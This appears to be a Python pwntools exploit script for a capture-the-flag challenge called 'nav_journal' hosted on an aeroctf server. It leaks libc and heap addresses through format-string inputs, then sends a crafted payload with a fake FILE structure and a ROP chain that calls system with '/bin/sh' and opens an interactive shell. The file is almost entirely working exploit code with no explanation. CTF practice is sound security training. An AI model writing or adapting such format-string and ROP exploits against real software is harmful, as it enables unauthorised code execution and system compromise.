from pwn import *
context.log_level = 'debug'
context.arch = 'i386'

TARGET = './nav_journal'
HOST = 'tasks.aeroctf.com'
PORT = 33013

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./ld-2.23.so", "LD_PRELOAD":"./libc.so.6"})
        return process(["./ld-2.23.so", TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x1719, 0x1a8a, 0x1b05, 0x1b1f])

r.sendafter('name: ', 'A')

r.sendlineafter('> ', '4')
r.sendlineafter(']: ', 'N')
r.sendlineafter('name: ', '%35$p')
r.recvuntil('/tmp/')
leak = int(r.recvuntil('\n')[:-1], 16)
dbg("leak")
base = leak - 0x18637
dbg("base")
xchg = base + 0x18ea7
p2 = base + 0x000a03a2
edi = base + 0x000177db
binsh = base + 0x15ba0b
system = base + 0x3ada0

r.sendlineafter('> ', '7')
r.sendlineafter('> ', '4')
r.sendlineafter(']: ', 'N')
r.sendlineafter('name: ', '%13$p')
r.recvuntil('/tmp/')
leak = int(r.recvuntil('\n')[:-1], 16)
dbg("leak")
heap = leak - 0x1830
dbg("heap")

r.sendlineafter('> ', '1')
r.sendlineafter('> ', '5')
data = ''
data += p32(0xfbad111)
data = data.ljust(0x46, 'A')
data += '\x00'*2
data += p32(0x804c120)
data = data.ljust(0x90, 'B')
data += p32(p2)
data += p32(heap+0x98)
data += p32(xchg)
data += p32(edi+1)*(350-32+24-11)
data += p32(system)
data += p32(binsh)
data += p32(binsh)

data = data.ljust(0x600, 'C')
r.sendafter('data: ', data+p32(heap+8))

r.sendlineafter('> ', '3')

r.interactive()
r.close()
